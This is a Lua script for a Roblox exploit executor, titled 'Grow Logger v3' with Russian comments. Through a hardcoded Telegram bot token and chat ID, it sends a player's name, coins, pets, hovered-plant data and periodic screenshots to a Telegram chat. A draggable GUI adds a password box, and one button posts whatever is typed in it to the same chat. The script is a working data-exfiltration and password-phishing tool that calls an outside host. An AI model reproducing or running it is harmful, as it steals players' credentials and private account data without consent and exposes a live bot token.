-- Grow Logger v3 — Drag GUI + Пароль (эмулированный ввод)
local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local Mouse = Players.LocalPlayer:GetMouse()
local Player = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local UIS = game:GetService("UserInputService")

local TOKEN = "8101289751:AAEk6wpg5UkUBY8S5dSRLcTI0M8TJIZssc4"
local CHAT_ID = "5678878569"
local INTERVAL = 120
local running = false
local HoveredInfo = ""

-- HTTP helper
local function req(url, data, json)
    local body = json and Http:JSONEncode(data) or data.Body
    if syn and syn.request then
        syn.request({Url=url, Method="POST", Headers=json and {["Content-Type"]="application/json"} or data.Headers, Body=body})
    elseif http_request then
        http_request({Url=url, Method="POST", Headers=json and {["Content-Type"]="application/json"} or data.Headers, Body=body})
    end
end

local function sendText(text)
    req("https://api.telegram.org/bot"..TOKEN.."/sendMessage", {chat_id=CHAT_ID, text=text}, true)
end

local function sendScreenshot()
    if getscreenshot then
        local img = getscreenshot()
        local boundary = "--b"..math.random(1,9e5)
        local body = boundary.."\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"..CHAT_ID..
                     "\r\n"..boundary.."\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"s.png\"\r\nContent-Type: image/png\r\n\r\n"..img.."\r\n"..boundary.."--"
        req("https://api.telegram.org/bot"..TOKEN.."/sendPhoto", {Headers={["Content-Type"]="multipart/form-data; boundary="..boundary}, Body=body})
    else
        sendText("⚠️ getscreenshot() не поддерживается")
    end
end

-- Наведение мыши на растения
Mouse.Move:Connect(function()
    local t = Mouse.Target
    if t and t:IsDescendantOf(Workspace) and t:FindFirstChild("Owner") and t.Owner.Value == Player then
        local n = t.Name
        local lvl = t:FindFirstChild("Level") and t.Level.Value or "?"
        local mut = t:FindFirstChild("Mutation") and t.Mutation.Value or "none"
        local price = t:FindFirstChild("Price") and t.Price.Value or "?"
        HoveredInfo = string.format("%s | L%s | M:%s | $%s", n, lvl, mut, price)
    else
        HoveredInfo = ""
    end
end)

-- Сбор инфы
local function collectInfo()
    local lines = {}
    table.insert(lines, "👤 "..Player.Name)
    local ls = Player:FindFirstChild("leaderstats")
    local coins = ls and ls:FindFirstChild("Coins") and ls.Coins.Value or 0
    local harvest = ls and ls:FindFirstChild("Harvest") and ls.Harvest.Value or 0
    table.insert(lines, "💰 "..coins.." | 🌾 "..harvest)

    local pets = {}
    for _, p in ipairs(Player:FindFirstChild("Pets") and Player.Pets:GetChildren() or {}) do
        table.insert(pets, p.Name)
    end
    table.insert(lines, "🐾 Pets: "..(#pets > 0 and table.concat(pets, ", ") or "Нет"))
    table.insert(lines, "🌱 Наведение: "..(HoveredInfo ~= "" and HoveredInfo or "Нет"))

    return table.concat(lines,"\n")
end

-- Отправить всё
local function sendAll()
    sendText(collectInfo())
    task.wait(1)
    sendScreenshot()
end

-- Авто-цикл
task.spawn(function()
    while task.wait(INTERVAL) do
        if running then sendAll() end
    end
end)

-- 📦 GUI
local gui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
gui.Name = "LoggerGUI"
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 280, 0, 240)
frame.Position = UDim2.new(0, 40, 0, 100)
frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
frame.Active = true
frame.Draggable = true -- 🎉 Двигаем мышкой

-- Эмулируем ввод пароля
local passwordInput = Instance.new("TextBox", frame)
passwordInput.PlaceholderText = "Введите пароль (тестово)"
passwordInput.Position = UDim2.new(0, 10, 0, 10)
passwordInput.Size = UDim2.new(1, -20, 0, 30)
passwordInput.Text = ""
passwordInput.TextColor3 = Color3.new(1,1,1)
passwordInput.BackgroundColor3 = Color3.fromRGB(50,50,50)
passwordInput.ClearTextOnFocus = false

-- Кнопки
local function mkBtn(text, y, color, callback)
    local b = Instance.new("TextButton", frame)
    b.Text = text
    b.Position = UDim2.new(0, 10, 0, y)
    b.Size = UDim2.new(1, -20, 0, 30)
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.SourceSans
    b.TextSize = 15
    b.MouseButton1Click:Connect(callback)
end

mkBtn("▶️ Старт авто", 50, Color3.fromRGB(70, 180, 70), function()
    running = true
    sendText("✅ Авто логгер включен.")
end)

mkBtn("⏹ Стоп авто", 90, Color3.fromRGB(180, 70, 70), function()
    running = false
    sendText("⛔ Авто логгер выключен.")
end)

mkBtn("📤 Отправить всё", 130, Color3.fromRGB(70, 70, 180), function()
    sendAll()
end)

mkBtn("📦 Отправить пароль", 170, Color3.fromRGB(140, 80, 200), function()
    local pass = passwordInput.Text
    if #pass > 2 then
        sendText("🔐 Введённый пароль: `"..pass.."`")
    else
        sendText("⚠️ Пароль не введён.")
    end
end)

mkBtn("✖ Закрыть GUI", 210, Color3.fromRGB(120, 120, 120), function()
    gui:Destroy()
end)
